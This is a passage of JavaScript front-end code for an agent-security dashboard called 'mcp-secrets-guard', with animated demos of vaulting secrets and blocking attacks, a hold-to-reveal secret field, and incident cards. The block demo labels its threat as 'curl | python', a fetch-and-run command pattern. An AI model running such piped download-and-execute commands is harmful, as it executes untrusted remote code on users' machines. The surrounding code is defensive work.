    var coreColor = mode === "block" ? "#ef4444" : mode === "vault" ? "#f59e0b" : blocked ? "#ef4444" : intercepted ? "#a855f7" : "#38bdf8";
    var progress = animStep / 100;

    // Secret capsule coordinates in vault demo
    var secretX = mode === "vault" ? (140 + Math.min(progress, 0.5) * 680) : -999;
    var vaultFlyProgress = progress > 0.5 ? Math.min((progress - 0.5) / 0.35, 1) : 0;
    var crystalX = mode === "vault" && progress > 0.5 && progress <= 0.88 ? (480 + vaultFlyProgress * 320) : -999;
    var crystalY = mode === "vault" && progress > 0.5 && progress <= 0.88 ? (115 - vaultFlyProgress * 47) : -999;

    var tokenFlyProgress = progress > 0.55 ? Math.min((progress - 0.55) / 0.45, 1) : 0;
    var tokenX = mode === "vault" && progress > 0.55 ? (480 + tokenFlyProgress * 300) : -999;
    var tokenY = mode === "vault" && progress > 0.55 ? (115 + tokenFlyProgress * 55) : -999;

    // Threat mine coordinates in block demo
    var mineX = mode === "block" ? (140 + Math.min(progress, 0.6) * 500) : -999;
    var exploded = mode === "block" && progress >= 0.6;

    return h("div", { className: "yg-card yg-arena-card wide" },
      h("svg", {
        className: "yg-arena-svg",
        viewBox: "0 0 960 260",
        preserveAspectRatio: "xMidYMid meet"
      },
        h("defs", null,
          // Central Shield Dynamic Shading
          h("linearGradient", { id: "cyberShieldGrad", x1: "0%", y1: "0%", x2: "0%", y2: "100%" },
            mode === "block" ? [
              h("stop", { offset: "0%", stopColor: "#f87171", key: "s1" }),
              h("stop", { offset: "50%", stopColor: "#ef4444", key: "s2" }),
              h("stop", { offset: "100%", stopColor: "#7f1d1d", key: "s3" })
            ] : mode === "vault" ? [
              h("stop", { offset: "0%", stopColor: "#fde68a", key: "s1" }),
              h("stop", { offset: "50%", stopColor: "#f59e0b", key: "s2" }),
              h("stop", { offset: "100%", stopColor: "#92400e", key: "s3" })
            ] : [
              h("stop", { offset: "0%", stopColor: "#38bdf8", key: "s1" }),
              h("stop", { offset: "50%", stopColor: "#0284c7", key: "s2" }),
              h("stop", { offset: "100%", stopColor: "#0c4a6e", key: "s3" })
            ]
          ),
          // Holographic Iridescent Border Gradient (Theme Hologram from Cline)
          h("linearGradient", { id: "holoIridescentGrad", x1: "0%", y1: "0%", x2: "100%", y2: "100%" },
            h("stop", { offset: "0%", stopColor: "#f472b6" }),
            h("stop", { offset: "25%", stopColor: "#38bdf8" }),
            h("stop", { offset: "50%", stopColor: "#c084fc" }),
            h("stop", { offset: "75%", stopColor: "#34d399" }),
            h("stop", { offset: "100%", stopColor: "#ffffff" })),
          // Squircle Dark Glass Fill
          h("radialGradient", { id: "holoBgGrad", cx: "50%", cy: "50%", r: "65%" },
            h("stop", { offset: "0%", stopColor: "#171d33" }),
            h("stop", { offset: "100%", stopColor: "#080c16" })),
          // Mascot Pearlescent Body Gradient
          h("linearGradient", { id: "holoMascotGrad", x1: "0%", y1: "0%", x2: "0%", y2: "100%" },
            h("stop", { offset: "0%", stopColor: "#ffffff" }),
            h("stop", { offset: "45%", stopColor: "#f1f5f9" }),
            h("stop", { offset: "100%", stopColor: "#cbd5e1" })),
          // Holographic Vault Crystal Gradient
          h("linearGradient", { id: "holoVaultGrad", x1: "0%", y1: "0%", x2: "100%", y2: "100%" },
            h("stop", { offset: "0%", stopColor: "#fde68a" }),
            h("stop", { offset: "50%", stopColor: "#f59e0b" }),
            h("stop", { offset: "100%", stopColor: "#b45309" })),
          // Global Network Hologram Gradient
          h("linearGradient", { id: "holoNetGrad", x1: "0%", y1: "0%", x2: "100%", y2: "100%" },
            h("stop", { offset: "0%", stopColor: "#7dd3fc" }),
            h("stop", { offset: "50%", stopColor: "#0284c7" }),
            h("stop", { offset: "100%", stopColor: "#0c4a6e" })),
          h("filter", { id: "agGlow" },
            h("feGaussianBlur", { stdDeviation: "4", result: "blur" }),
            h("feMerge", null,
              h("feMergeNode", { in: "blur" }),
              h("feMergeNode", { in: "SourceGraphic" }))),
          h("filter", { id: "holoShieldGlow" },
            h("feDropShadow", { dx: 0, dy: 0, stdDeviation: "12", floodColor: coreColor, floodOpacity: "0.85" })),
          h("filter", { id: "holoMascotShadow" },
            h("feDropShadow", { dx: 0, dy: 3, stdDeviation: "4", floodColor: "rgba(0,0,0,0.7)", floodOpacity: "0.8" })),
          h("pattern", { id: "agGrid", width: "30", height: "30", patternUnits: "userSpaceOnUse" },
            h("path", { d: "M 30 0 L 0 0 0 30", fill: "none", stroke: "rgba(56, 189, 248, 0.06)", strokeWidth: "1" }))
        ),

        // Background Cyber Grid
        h("rect", { width: "960", height: "260", fill: "url(#agGrid)" }),

        // Neon Data Conduits
        // Path 1: Agent Gateway -> Central Shield
        h("path", {
          d: "M 175 115 L 430 115",
          fill: "none",
          stroke: mode === "block" ? "rgba(239,68,68,0.5)" : "rgba(56,189,248,0.45)",
          strokeWidth: 4,
          className: "yg-conduit-active"
        }),
        // Path 2: Central Shield -> Hologram Vault
        h("path", {
          d: "M 530 95 C 610 55, 700 60, 775 68",
          fill: "none",
          stroke: mode === "vault" ? "rgba(251,191,36,0.85)" : "rgba(245,158,11,0.35)",
          strokeWidth: 3.5,
          className: mode === "vault" ? "yg-conduit-active" : "yg-flow-path"
        }),
        // Path 3: Central Shield -> Hologram Internet
        h("path", {
          d: "M 530 135 C 610 175, 700 175, 775 175",
          fill: "none",
          stroke: "rgba(56,189,248,0.45)",
          strokeWidth: 3.5,
          className: "yg-conduit-active"
        }),

        // Continuous Dynamic Traffic Streams (Glide into Central Shield)
        mode === "patrol" ? h("g", null,
          h("circle", { cx: 180, cy: 115, r: 4.5, fill: "#38bdf8", filter: "url(#agGlow)", className: "yg-stream-pkt-1" }),
          h("circle", { cx: 180, cy: 115, r: 4, fill: "#34d399", filter: "url(#agGlow)", className: "yg-stream-pkt-2" }),
          h("circle", { cx: 180, cy: 115, r: 4.5, fill: "#c084fc", filter: "url(#agGlow)", className: "yg-stream-pkt-3" }),
          // Outbound verified streams
          h("circle", { cx: 530, cy: 135, r: 4, fill: "#38bdf8", filter: "url(#agGlow)", className: "yg-out-pkt-bot" })
        ) : null,

        // LEFT NODE: Active AI Session Gateway with Hologram Cline Mascot (Fully padded, no clipping!)
        h("g", { transform: "translate(125, 115)" },
          // Holographic Ground Projection Ring
          h("ellipse", {
            cx: 0, cy: 46, rx: 42, ry: 10,
            fill: "none", stroke: "url(#holoIridescentGrad)",
            strokeWidth: 1.5, className: "yg-holo-ring", filter: "url(#agGlow)"
          }),

          // The Squircle Container (Hologram Theme from Cline)
          h("rect", {
            x: -38, y: -38, width: 76, height: 76, rx: 18,
            fill: "url(#holoBgGrad)",
            stroke: "url(#holoIridescentGrad)",
            strokeWidth: 2.2,
            filter: "url(#agGlow)",
            className: "yg-holo-border"
          }),

          // Diagonal Glass Gloss Reflection
          h("path", {
            d: "M -34 -12 L -12 -34 L 8 -34 L -34 8 Z",
            fill: "rgba(255, 255, 255, 0.08)"
          }),

          // Sweeping Laser Scanline
          h("line", {
            x1: -30, y1: 0, x2: 30, y2: 0,
            stroke: "rgba(56,189,248,0.75)",
            strokeWidth: 1.5,
            className: "yg-holo-scanline"
          }),

          // Cline Mascot Silhouette (Pearlescent Bot Head)
          h("path", {
            d: "M -5 -17 A 4.5 4.5 0 0 1 5 -17 L 14 -17 A 4.5 4.5 0 0 1 19 -12.5 L 19 -4.5 L 25 0 L 19 4.5 L 19 12.5 A 4.5 4.5 0 0 1 14 17 L -14 17 A 4.5 4.5 0 0 1 -19 12.5 L -19 4.5 L -25 0 L -19 -4.5 L -19 -12.5 A 4.5 4.5 0 0 1 -14 -17 Z",
            fill: "url(#holoMascotGrad)",
            stroke: "rgba(255,255,255,0.7)",
            strokeWidth: 1.2,
            filter: "url(#holoMascotShadow)"
          }),

          // Vertical Slit Eyes | |
          h("rect", { x: -7.5, y: -5.5, width: 4, height: 12, rx: 2, fill: "#0b0f19" }),
          h("circle", { cx: -5.5, cy: -2, r: 1.2, fill: "#38bdf8" }),
          h("rect", { x: 3.5, y: -5.5, width: 4, height: 12, rx: 2, fill: "#0b0f19" }),
          h("circle", { cx: 5.5, cy: -2, r: 1.2, fill: "#38bdf8" }),

          // Wrapped Chat Name Badge (No technical word 'HOLOGRAM')
          renderWrappedText(chatName, 0, 56, 18, 2, 10.5, "#f1f5f9", 700),
          h("text", {
            x: 0, y: chatName.length > 18 ? 84 : 70,
            textAnchor: "middle", fill: "#94a3b8", fontSize: 9.5
          }, currentLang === "ru" ? "Шлюз ИИ-сеанса" : "Agent Gateway")
        ),

        // CENTER NODE: CENTRAL SECURITY SHIELD (mcp-secrets-guard Core Interceptor)
        h("g", { transform: "translate(480, 115)", className: "yg-center-shield" },
          // Ground Projection Ring
          h("ellipse", {
            cx: 0, cy: 56, rx: 48, ry: 12,
            fill: "none",
            stroke: mode === "block" ? "#ef4444" : mode === "vault" ? "#fbbf24" : "url(#cyberShieldGrad)",
            strokeWidth: 1.6, className: "yg-holo-ring", filter: "url(#agGlow)"
          }),

          // Detonation Shockwaves on Threat Block
          exploded ? h("g", null,
            h("circle", { cx: -35, cy: 0, r: 46, fill: "none", stroke: "#ef4444", strokeWidth: 3, opacity: 0.95 }),
            h("circle", { cx: -35, cy: 0, r: 68, fill: "none", stroke: "#fca5a5", strokeWidth: 2, opacity: 0.5 })
          ) : null,

          // The Majestic Vector Cyber Shield Crest
          h("path", {
            d: "M 0 -48 C 36 -48 48 -28 48 4 C 48 38 24 60 0 74 C -24 60 -48 38 -48 4 C -48 -28 -36 -48 0 -48 Z",
            fill: "url(#cyberShieldGrad)",
            stroke: mode === "block" ? "#fca5a5" : mode === "vault" ? "#fffbeb" : "#a5f3fc",
            strokeWidth: 2.4,
            filter: "url(#holoShieldGlow)",
            className: mode === "patrol" ? "yg-shield-glow" : undefined
          }),

          // Inner Bevel Facet
          h("path", {
            d: "M 0 -42 C 30 -42 40 -24 40 4 C 40 32 20 51 0 63 C -20 51 -40 32 -40 4 C -40 -24 -30 -42 0 -42 Z",
            fill: "rgba(10, 15, 30, 0.75)",
            stroke: "rgba(255, 255, 255, 0.22)",
            strokeWidth: 1.2
          }),

          // Diagonal Glass Gloss Reflection
          h("path", {
            d: "M -36 -12 L -12 -38 L 8 -38 L -36 12 Z",
            fill: "rgba(255, 255, 255, 0.12)"
          }),

          // Sweeping Laser Scanline
          h("line", {
            x1: -32, y1: 0, x2: 32, y2: 0,
            stroke: mode === "block" ? "rgba(239,68,68,0.9)" : mode === "vault" ? "rgba(251,191,36,0.9)" : "rgba(56,189,248,0.8)",
            strokeWidth: 1.5,
            className: "yg-holo-scanline"
          }),

          // Inner Core Emblem
          mode === "vault" ? h("g", null,
            h("circle", { cx: 0, cy: 6, r: 15, fill: "rgba(245,158,11,0.25)", stroke: "#fbbf24", strokeWidth: 2 }),
            h("path", { d: "M -6 4 L -2 9 L 7 0", fill: "none", stroke: "#fff", strokeWidth: 2.2, strokeLinecap: "round" })
          ) : mode === "block" ? h("g", null,
            h("circle", { cx: 0, cy: 6, r: 16, fill: "rgba(239,68,68,0.3)", stroke: "#ef4444", strokeWidth: 2 }),
            h("path", { d: "M -7 -1 L 7 13 M 7 -1 L -7 13", stroke: "#fee2e2", strokeWidth: 2.4, strokeLinecap: "round" })
          ) : h("g", null,
            // Cyber Lock Core
            h("path", { d: "M -8 -2 C -8 -9 8 -9 8 -2 L 8 4 L -8 4 Z", fill: "none", stroke: "#e0f2fe", strokeWidth: 2.4 }),
            h("rect", { x: -12, y: 4, width: 24, height: 18, rx: 3.5, fill: "url(#cyberShieldGrad)", stroke: "#e0f2fe", strokeWidth: 1.5 }),
            h("circle", { cx: 0, cy: 12, r: 2.5, fill: "#0b0f19" }),
            h("line", { x1: 0, y1: 14.5, x2: 0, y2: 18, stroke: "#0b0f19", strokeWidth: 1.8, strokeLinecap: "round" })
          ),

          // Titles under Shield (NO WORD 'HOLOGRAM'!)
          h("text", {
            x: 0, y: 92, textAnchor: "middle",
            fill: mode === "block" ? "#ef4444" : mode === "vault" ? "#fbbf24" : "#38bdf8",
            fontSize: 11.5, fontWeight: 700, letterSpacing: "0.06em"
          },
            mode === "vault" ? (currentLang === "ru" ? "🔒 СЕКРЕТ ПЕРЕХВАЧЕН" : "🔒 SECRET VAULTED")
              : mode === "block" ? (currentLang === "ru" ? "⛔ УГРОЗА ЗАБЛОКИРОВАНА" : "⛔ THREAT BLOCKED")
                : "mcp-secrets-guard"
          ),
          h("text", { x: 0, y: 106, textAnchor: "middle", fill: "#94a3b8", fontSize: 9.5 },
            mode === "vault" ? (currentLang === "ru" ? "Изоляция и замена на токен" : "Isolated & masked with token")
              : mode === "block" ? (currentLang === "ru" ? "Опасное действие нейтрализовано" : "Dangerous payload neutralized")
                : (currentLang === "ru" ? "Защита в реальном времени" : "Real-time zero-leak barrier")
          )
        ),

        // VAULT DEMO: Flying Secret Capsule & Masked Outbound Token
        mode === "vault" && progress <= 0.5 ? h("g", { transform: "translate(" + secretX + ", 115)" },
          h("rect", { x: -28, y: -11, width: 56, height: 22, rx: 11, fill: "#7c3aed", stroke: "#ffd700", strokeWidth: 2, filter: "url(#agGlow)" }),
          h("text", { x: 0, y: 4, textAnchor: "middle", fill: "#fff", fontSize: 9.5, fontWeight: 700 }, "🔑 sk-ant…")
        ) : null,
        mode === "vault" && progress > 0.5 && progress <= 0.88 ? h("g", { transform: "translate(" + crystalX + ", " + crystalY + ")" },
          h("circle", { cx: 0, cy: 0, r: 7, fill: "#ffd700", filter: "url(#agGlow)" })
        ) : null,
        mode === "vault" && progress > 0.55 ? h("g", { transform: "translate(" + tokenX + ", " + tokenY + ")" },
          h("rect", { x: -44, y: -10, width: 88, height: 20, rx: 5, fill: "rgba(56,189,248,0.2)", stroke: "#38bdf8", strokeWidth: 1.5, filter: "url(#agGlow)" }),
          h("text", { x: 0, y: 4, textAnchor: "middle", fill: "#38bdf8", fontSize: 8.5, fontWeight: 700 }, "msg_tok_***")
        ) : null,

        // BLOCK DEMO: Approaching Threat Mine & Pulverizing Sparks
        mode === "block" && !exploded ? h("g", { transform: "translate(" + mineX + ", 115)" },
          h("circle", { cx: 0, cy: 0, r: 14, fill: "#990000", stroke: "#ef4444", strokeWidth: 2.5, filter: "url(#agGlow)" }),
          h("path", { d: "M -6 -6 L 6 6 M 6 -6 L -6 6", stroke: "#fff", strokeWidth: 2 }),
          h("text", { x: 0, y: 24, textAnchor: "middle", fill: "#fca5a5", fontSize: 9, fontWeight: 700 }, "curl | python")
        ) : null,
        exploded ? h("g", { transform: "translate(440, 115)" },
          // Explosive sparks
          h("circle", { cx: -20, cy: -18, r: 3.5, fill: "#ef4444", filter: "url(#agGlow)" }),
          h("circle", { cx: -28, cy: 12, r: 3, fill: "#fbbf24", filter: "url(#agGlow)" }),
          h("circle", { cx: -15, cy: 22, r: 3.5, fill: "#ef4444", filter: "url(#agGlow)" }),
          h("circle", { cx: -34, cy: -6, r: 2.5, fill: "#fff", filter: "url(#agGlow)" })
        ) : null,

        // RIGHT TOP: Armored Holographic Vault Node
        h("g", { transform: "translate(820, 68)" },
          h("rect", {
            x: -40, y: -30, width: 80, height: 60, rx: 10,
            fill: "url(#holoVaultGrad)", stroke: mode === "vault" ? "#fff" : "#f59e0b", strokeWidth: 2,
            filter: "url(#agGlow)",
            className: mode === "vault" ? "yg-vault-glow" : ""
          }),
          // Facet overlay
          h("path", { d: "M -40 -8 L 0 -30 L 40 -8 L 0 30 Z", fill: "rgba(255,255,255,0.12)" }),
          // Lock Core
          h("circle", { cx: 0, cy: 0, r: 14, fill: "#1c1404", stroke: "#fde68a", strokeWidth: 1.8 }),
          h("circle", { cx: 0, cy: 0, r: 4.5, fill: "#fde68a" }),
          h("line", { x1: 0, y1: -14, x2: 0, y2: -8, stroke: "#fde68a", strokeWidth: 2 }),
          // Vault Counter Badge
          h("text", { x: 0, y: 46, textAnchor: "middle", fill: "#fde68a", fontSize: 11, fontWeight: 700 },
            (currentLang === "ru" ? "Сейф: " : "Vault: ") + (vaultCount + vaultBonus)),
          h("text", { x: 0, y: 58, textAnchor: "middle", fill: "#94a3b8", fontSize: 9.5 },
            currentLang === "ru" ? "Шифрование AES" : "Hardware AES"),
          vaultBonus > 0 && mode === "vault" ? h("text", { x: 38, y: -20, fill: "#ffd700", fontSize: 12, fontWeight: 900 }, "+1") : null
        ),

        // RIGHT BOTTOM: External Internet Node
        h("g", { transform: "translate(820, 175)" },
          h("circle", { cx: 0, cy: 0, r: 34, fill: "url(#holoNetGrad)", stroke: "#38bdf8", strokeWidth: 2, filter: "url(#agGlow)" }),
          // Holographic globe lattice
          h("circle", { cx: 0, cy: 0, r: 23, fill: "none", stroke: "rgba(255,255,255,0.75)", strokeWidth: 1.4 }),
          h("ellipse", { cx: 0, cy: 0, rx: 10, ry: 23, fill: "none", stroke: "rgba(255,255,255,0.65)", strokeWidth: 1.1 }),
          h("line", { x1: -23, y1: 0, x2: 23, y2: 0, stroke: "rgba(255,255,255,0.65)", strokeWidth: 1.1 }),
          // Destination labels - Wrapped without clipping!
          h("text", { x: 0, y: 48, textAnchor: "middle", fill: "#bae6fd", fontSize: 11, fontWeight: 700 },
            currentLang === "ru" ? "Интернет" : "Internet"),
          renderWrappedText(dest, 0, 62, 18, 2, 9.5, "#94a3b8")
        )
      ),

      // Dynamic Arena Status Banner
      mode === "vault" ? h("div", { className: "yg-arena-status-banner vault" },
        currentLang === "ru" ? "🔒 СЕКРЕТ ПЕРЕХВАЧЕН И СПРЯТАН В СЕЙФ · В СЕТЬ ОТПРАВЛЕН ТОКЕН msg_tok_***"
          : "🔒 SECRET INTERCEPTED & STORED IN VAULT · MASKED msg_tok_*** SENT TO INTERNET")
        : mode === "block" ? h("div", { className: "yg-arena-status-banner danger" },
          currentLang === "ru" ? "⛔ УГРОЗА УНИЧТОЖЕНА ДО ЗАПУСКА · ОПАСНЫЙ СКРИПТ РАЗОРВАН"
            : "⛔ THREAT DESTROYED BEFORE EXECUTION · MALICIOUS PAYLOAD SHREDDED")
          : null,

      // Arena Interactive Controls Toolbar
      h("div", { className: "yg-arena-toolbar" },
        h("button", {
          type: "button",
          className: "yg-arena-btn vault",
          onClick: startVaultDemo,
          disabled: mode !== "patrol"
        }, currentLang === "ru" ? "⚡ Демо: Перехват пароля" : "⚡ Demo: Mask Secret"),
        h("button", {
          type: "button",
          className: "yg-arena-btn block",
          onClick: startBlockDemo,
          disabled: mode !== "patrol"
        }, currentLang === "ru" ? "💥 Демо: Отражение атаки" : "💥 Demo: Block Attack"),
        h("button", {
          type: "button",
          className: "yg-arena-btn live",
          onClick: doRefresh
        }, currentLang === "ru" ? "🔄 Живой режим (Обновить)" : "🔄 Live Mode (Refresh)"),
        h("span", { className: "yg-dim yg-small yg-right" },
          currentLang === "ru" ? "60 FPS аппаратное ускорение SVG" : "60 FPS GPU-accelerated SVG")
      ),

      // Telemetry Summary Cards Strip
      h("div", { className: "yg-vismap-cards", style: { display: "flex", gap: 8, marginTop: 10 } },
        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
            currentLang === "ru" ? "Состояние компьютера" : "Computer State"),
          h("div", { className: "yg-big", style: { color: coreColor, marginTop: 4 } },
            blocked ? (currentLang === "ru" ? "⚠️ Атака отражена" : "⚠️ Threat blocked")
              : intercepted ? (currentLang === "ru" ? "📈 Секрет замаскирован" : "📈 Secret masked")
                : (currentLang === "ru" ? "✅ Защита работает" : "✅ Guard active")),
          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } },
            currentLang === "ru" ? "Все действия ИИ проверяются до запуска." : "All agent actions inspected before execution.")
        ),
        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
            currentLang === "ru" ? "Активный сеанс" : "Active Session"),
          h("div", { className: "yg-big", style: { marginTop: 4, fontSize: "13px", fontWeight: 700 } },
            items.length ? chatName : (currentLang === "ru" ? "Ожидание сеанса" : "Idle")),
          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } }, dest)
        ),
        h("div", { className: "yg-card", style: { flex: 1, padding: 8 } },
          h("div", { className: "yg-dim yg-small", style: { textTransform: "uppercase", letterSpacing: ".1em" } },
            currentLang === "ru" ? "Политика перехвата" : "Inspection Policy"),
          h("div", { className: "yg-big", style: { marginTop: 4, color: "#3ec46d" } },
            currentLang === "ru" ? "Строгий Fail-closed" : "Strict Fail-closed"),
          h("div", { className: "yg-dim yg-small", style: { marginTop: 3 } },
            currentLang === "ru" ? "Сейф с DPAPI шифрованием." : "Vault secured with DPAPI.")
        )
      )
    );
  }

  // Masked secret with a hold-to-show eye
  function Reveal(p) {
    const [value, setValue] = useState("");
    const [err, setErr] = useState("");
    const held = useRef(false);
    const timer = useRef(null);
    function hide() { held.current = false; clearTimeout(timer.current); setValue(""); }
    function show() {
      held.current = true; setErr("");
      post("/incidents/reveal", { incident: p.incident, index: p.index }).then(function (r) {
        if (!held.current) return;
        if (r.status === "ok") { setValue(r.value); clearTimeout(timer.current); timer.current = setTimeout(hide, 10000); }
        else { setErr(r.message || "Could not show the value."); setTimeout(function () { setErr(""); }, 4000); }
      }).catch(function () { setErr("Could not reach the Guard backend."); });
    }
    useEffect(function () { return function () { held.current = false; clearTimeout(timer.current); }; }, []);
    function key(e) { return e.key === " " || e.key === "Enter"; }
    return h("span", { className: "yg-reveal" + (value ? " yg-reveal-on" : "") },
      h("span", { className: "yg-reveal-val yg-mono" }, value || p.preview),
      h("button", {
        type: "button", className: "yg-reveal-btn",
        title: "Hold to show the full value",
        "aria-label": "Hold to show the full value", "aria-pressed": !!value,
        onPointerDown: function (e) { e.preventDefault(); show(); }, onPointerUp: hide, onPointerLeave: hide,
        onBlur: hide, onKeyDown: function (e) { if (key(e) && !held.current) { e.preventDefault(); show(); } },
        onKeyUp: function (e) { if (key(e)) hide(); }
      }, value ? "🙈" : "👁"),
      err ? h("span", { className: "yg-err yg-small" }, err) : null);
  }

  // =========================================================================
  // TASK 3.2: CLEAN INCIDENT CARD (Single Code Block & Toolbar)
  // =========================================================================
  function IncidentCard(p) {
    const inc = p.inc;
    const inAccordion = !!p.inAccordion;
    const [busy, setBusy] = useState("");
    const [note, setNote] = useState("");
    const [ruleOpen, setRuleOpen] = useState(false);
    const [ruleBusy, setRuleBusy] = useState("");
    const pending = inc.status === "pending";

    function choose(choice) {
      setBusy(choice);
      post("/incidents/decide", { incident: inc.id, choice: choice })
        .then(function (r) { setNote(r.status === "ok" ? r.next : (r.message || "Could not save the decision.")); p.onChanged(); })
        .catch(function () { setNote("Could not reach the Guard backend."); })
        .finally(function () { setBusy(""); });
    }

    function makeRule(action, matchType, match) {
      if (!match) { setNote(currentLang === "ru" ? "Нечего запоминать: нет домена или инструмента." : "Nothing to remember: no domain or tool."); return; }
      setRuleOpen(false); setRuleBusy(action + ":" + matchType);
      post("/rules", { action: action, match_type: matchType, match: match, incident: inc.id })
        .then(function (r) {
          setRuleBusy("");
          if (r.status === "ok") {
            setNote(currentLang === "ru"
              ? ("Постоянное правило создано: " + (action === "block" ? "всегда блокировать" : "всегда разрешать") + " " + matchType + " «" + match + "».")
              : ("Persistent rule created: always " + action + " " + matchType + " \"" + match + "\"."));
          } else setNote(r.message || "Could not save rule.");
        })
        .catch(function () { setRuleBusy(""); setNote("Could not reach the Guard backend."); });
    }

    const domain = (inc.destination || "").replace(/^[a-z]+:\/\//i, "").split(/[/?#]/)[0] || "";
    var rawTitle = "";
    if (inc.agent && (inc.agent.chat_title || inc.agent.session_title)) {
      rawTitle = inc.agent.chat_title || inc.agent.session_title;
    } else if (inc.agent && inc.agent.session_id) {
      var resolved = resolveChatTitle(inc.agent.session_id);
      rawTitle = resolved.raw || resolved.title;
    }
    rawTitle = String(rawTitle || "").replace(/^(?:чат|chat)\s*[:«"']?\s*/i, "").replace(/[»"']$/i, "").trim();
    const who = rawTitle
      ? (currentLang === "ru" ? "«" + rawTitle + "»" : "\"" + rawTitle + "\"")
      : (inc.agent && inc.agent.session_id
          ? (currentLang === "ru" ? "«Сеанс #" + String(inc.agent.session_id).slice(-6) + "»" : "\"Session #" + String(inc.agent.session_id).slice(-6) + "\"")
          : (currentLang === "ru" ? "«ИИ-агент»" : "\"AI agent\""));

    // Full command string: command, risk snippet, or tool+dest
    const fullCode = inc.command || (inc.risks && inc.risks[0] && inc.risks[0].snippet) || ((inc.tool || "") + " " + (inc.destination || ""));

    return h("div", { className: "yg-inc " + (pending ? "pending" : "done") },
      // Top row only if not already rendered inside accordion header
      !inAccordion ? h("div", { className: "yg-inc-top" },
        h("span", { className: "yg-inc-id" }, inc.id),
        h(Pill, { kind: pending ? "bad" : inc.status === "quarantined" ? "warn" : "ok" }, getStatusText(inc.status)),
        h("span", { className: "yg-dim yg-right" }, fmtTs(inc.at) + (inc.attempts > 1 ? " · " + inc.attempts + " attempts" : "")),
        h("span", { style: { position: "relative" } },
          h("button", {
            type: "button", className: "yg-btn ghost", disabled: !!ruleBusy,
            title: "Rule", onClick: function () { setRuleOpen(!ruleOpen); }
          }, ruleBusy ? "…" : (currentLang === "ru" ? "⚙ Постоянное правило" : "⚙ Rule")),
          ruleOpen ? h("div", {
            className: "yg-vault-menu-dropdown", role: "menu",
            style: { position: "absolute", right: 0, top: "100%", zIndex: 40, minWidth: "230px" }
          },
            domain ? h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { makeRule("block", "domain", domain); }
            }, (currentLang === "ru" ? "⛔ Всегда блокировать домен " : "⛔ Always block domain ") + domain) : null,
            domain ? h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { makeRule("allow", "domain", domain); }
            }, (currentLang === "ru" ? "✓ Всегда разрешать домен " : "✓ Always allow domain ") + domain) : null,
            inc.tool ? h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { makeRule("block", "tool", inc.tool); }
            }, (currentLang === "ru" ? "⛔ Всегда блокировать инструмент " : "⛔ Always block tool ") + inc.tool) : null,
            inc.tool ? h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { makeRule("allow", "tool", inc.tool); }
            }, (currentLang === "ru" ? "✓ Всегда разрешать инструмент " : "✓ Always allow tool ") + inc.tool) : null
          ) : null)
      ) : null,

      // Context story line
      (inc.findings || []).length ? h("div", { className: "yg-inc-story" },
        currentLang === "ru" ? "В чате " : "In chat ",
        h("b", null, who),
        currentLang === "ru" ? " ИИ-помощник попытался передать данные через инструмент: " : " agent attempted to send data via tool: ",
        h("b", { className: "yg-mono" }, (inc.destination ? T(inc.destination).replace(/^команда:\s*/i, "").replace(/^shell:\s*/i, "") : (inc.tool || "terminal"))),
        inc.destination && inc.destination.startsWith("http") ? (currentLang === "ru" ? " на адрес " : " to ") : null,
        inc.destination && inc.destination.startsWith("http") ? h("b", { className: "yg-mono" }, inc.destination) : null,
        ".") : null,

      // Single Clean Command Box with Actions
      fullCode ? h("div", { className: "yg-fullcmd" },
        h("pre", { className: "yg-mono yg-fullcmd-pre" }, fullCode),
        h("div", { className: "yg-fullcmd-actions" },
          h("button", {
            type: "button", className: "yg-btn ghost",
            onClick: function () { copyText(fullCode); }
          }, currentLang === "ru" ? "⧉ Копировать команду" : "⧉ Copy command"),
          h("button", {
            type: "button", className: "yg-btn ghost",
            onClick: function () { miniReport(inc, "txt"); }
          }, currentLang === "ru" ? "Отчёт TXT" : "TXT Report"),
          h("button", {
            type: "button", className: "yg-btn ghost",
            onClick: function () { miniReport(inc, "json"); }
          }, currentLang === "ru" ? "Отчёт JSON" : "JSON Report"),
          inAccordion ? h("button", {
            type: "button", className: "yg-btn ghost",
            onClick: function () { setRuleOpen(!ruleOpen); }
          }, currentLang === "ru" ? "⚙ Постоянное правило" : "⚙ Rule") : null
        )
      ) : null,

      // Risks details (Explanation & Safer alternative, no duplicate code block)
      (inc.risks || []).map(function (r, i) {
        return h("div", { className: "yg-risk", key: "r" + i },
          h("div", null, currentLang === "ru" ? "В чате " : "In chat ", h("b", null, who), currentLang === "ru" ? " ИИ-помощник попытался: " : " agent attempted: ", h("b", null, T(r.title)), "."),
          h("div", { className: "yg-dim" }, T(r.why)),
          h("div", { className: "yg-ok yg-small", style: { marginTop: 4, fontWeight: 700 } },
            T("Safer: ") + T(r.safer)));
      }),

      // Findings list
      h("div", { className: "yg-inc-what" },
        (inc.findings || []).map(function (f, i) {
          return h("div", { className: "yg-row", key: i },
            h(Chip, { label: { id: f.label, label: f.title } }),
            f.token ? h(Reveal, { incident: inc.id, index: i, preview: f.preview })
              : h("span", { className: "yg-mono yg-dim" }, f.preview),
            f.path ? h("span", { className: "yg-dim yg-small" }, "in " + f.path) : null,
            f.token ? h("span", { className: "yg-dim" }, "→ " + f.token.slice(0, 24) + "…") : null);
        })),

      // Process metadata
      inc.process ? h("div", { className: "yg-dim yg-small" },
        (currentLang === "ru" ? "Программа: " : "Program: ") + (inc.process.name || "Hermes") +
        " · " + (currentLang === "ru" ? "Сеанс №" : "Session #") + (inc.agent && inc.agent.session_id ? String(inc.agent.session_id).slice(-8) : "—") +
        " (pid " + inc.process.pid + ")") : null,

      // Decision buttons
      pending ? h("div", { className: "yg-actions" },
        (inc.findings || []).length && !(inc.risks || []).length ? h("button", {
          className: "yg-btn good", disabled: !!busy, onClick: function () { choose("protect"); }
        }, busy === "protect" ? "…" : (currentLang === "ru" ? "🛡 Защитить и отправить" : "Protect & send")) : null,
        h("button", {
          className: "yg-btn bad", disabled: !!busy, onClick: function () { choose("block"); }
        }, busy === "block" ? "…" : ((inc.risks || []).length
